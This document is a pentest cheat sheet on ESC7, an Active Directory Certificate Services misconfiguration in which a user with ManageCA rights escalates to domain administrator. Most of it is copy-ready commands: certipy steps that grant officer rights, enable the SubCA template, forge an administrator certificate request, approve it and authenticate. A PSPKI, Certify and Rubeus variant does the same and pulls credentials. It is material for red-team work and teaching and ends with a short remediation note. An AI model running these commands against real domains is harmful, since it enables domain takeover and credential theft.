# ESC7 - Vulnerable Certificate Authority Access Control

## Why It's Vulnerable

Your account holds `ManageCA` or `ManageCertificates` on the CA object itself.

| Right | What it lets you do |
|---|---|
| `ManageCA` | CA administrator - can enable templates, grant officer rights, modify CA config |
| `ManageCertificates` | CA officer - can approve or reissue any pending certificate request |

`ManageCA` alone is enough because you can grant yourself `ManageCertificates`.

## The Attack (ManageCA -> ManageCertificates -> Cert)

**Step 1 - Grant yourself officer rights**
```sh
certipy ca -ca CORP-CA -u user@corp.local -p pass \
  -add-officer user
```

**Step 2 - Enable the `SubCA` template (present by default on every CA)**
```sh
certipy ca -ca CORP-CA -u user@corp.local -p pass \
  -enable-template SubCA
```

**Step 3 - Request a cert. `SubCA` denies enrollment for normal users, but the request goes into a "pending/failed" queue you can now approve as an officer.**
```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template SubCA \
  -upn administrator@corp.local
# Note the request ID from the [!] output
```

**Step 4 - Approve your own denied request and retrieve the cert**
```sh
certipy ca -ca CORP-CA -u user@corp.local -p pass \
  -issue-request <request-id>

certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -retrieve <request-id>

certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```

### Certify.exe + PSPKI (Windows alternative)

Certify enumerates CA permissions (`Certify.exe cas`) but doesn't grant officer rights or approve requests. Use the **PSPKI** PowerShell module for the CA-officer manipulation:

```powershell
Import-Module PSPKI

# Step 1: grant self ManageCertificates on the CA (needs ManageCA)
Get-CertificationAuthority -Name CORP-CA | Get-CertificationAuthorityAcl | \
  Add-CertificationAuthorityAcl -Identity CORP\user -AccessType Allow -AccessMask ManageCertificates | \
  Set-CertificationAuthorityAcl

# Step 2: enable SubCA template
Get-CertificationAuthority -Name CORP-CA | \
  Add-CATemplate -Template SubCA

# Step 3: request as DA (Certify) - will go pending
Certify.exe request /ca:CA-HOST\CORP-CA /template:SubCA /altname:administrator
# Note the request ID from Certify output

# Step 4: approve the pending request, then retrieve
Get-CertificationAuthority -Name CORP-CA | Get-PendingRequest -RequestID <id> | Approve-CertificateRequest
Certify.exe download /ca:CA-HOST\CORP-CA /id:<id>

Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> /nowrap /getcredentials
```

---

## Remediation

Audit CA-object ACLs. Only Enterprise Admins / CA Admins should hold `ManageCA` or `ManageCertificates`. Review who currently has these rights with `certipy find -stdout` (shows CA permissions in output).
